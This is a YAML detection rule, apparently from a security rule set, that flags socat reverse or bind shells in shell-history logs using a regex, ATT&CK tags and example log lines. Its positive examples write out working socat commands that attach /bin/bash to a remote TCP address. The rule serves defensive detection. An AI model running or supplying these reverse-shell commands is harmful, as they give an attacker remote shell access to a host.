- id: mention.revshell_socat_exec_shell
  title: 'socat EXEC or SYSTEM address with a shell'
  match:
    anchored: 'socat [^\n]{0,120}(?:exec|system):["'']?(?:/usr)?(?:/bin/)?(?:ba|da|z|k|a)?sh\b'
  case_sensitive: false
  strength: strong
  attack: [T1059.004, T1095]
  telemetry: [any]
  source:
    name: Reverse Shell Generator (revshells.com) command catalog
    url: https://github.com/0dayCTF/reverse-shell-generator/blob/9fda27f91b1b1f370539dd534bc3bbb1f6b49bf6/js/data.js
    license: MIT
    upstream_id: null
  rationale: >-
    socat with an EXEC or SYSTEM address running a shell connects the shell to the other address (TCP, UDP, SSL);
    this is the socat reverse or bind shell in any argument order. Serial and PPP setups exec other programs.
  examples:
    positive:
      - 'Nov 20 10:10:00 web01 bash[5123]: HISTORY: socat TCP:203.0.113.7:4444 EXEC:/bin/bash'
      - 'Nov 20 10:10:01 web01 bash[5124]: HISTORY: socat TCP:203.0.113.7:443 EXEC:''bash'',pty,stderr,setsid,sigint,sane'
    negative:
      - 'Nov 20 10:10:02 gw01 bash[5125]: HISTORY: socat PTY,link=/dev/ttyV0 EXEC:''/usr/sbin/pppd call isp'''
      - 'Nov 20 10:10:03 gw01 bash[5126]: HISTORY: socat TCP-LISTEN:8080,fork TCP:10.0.0.8:80'

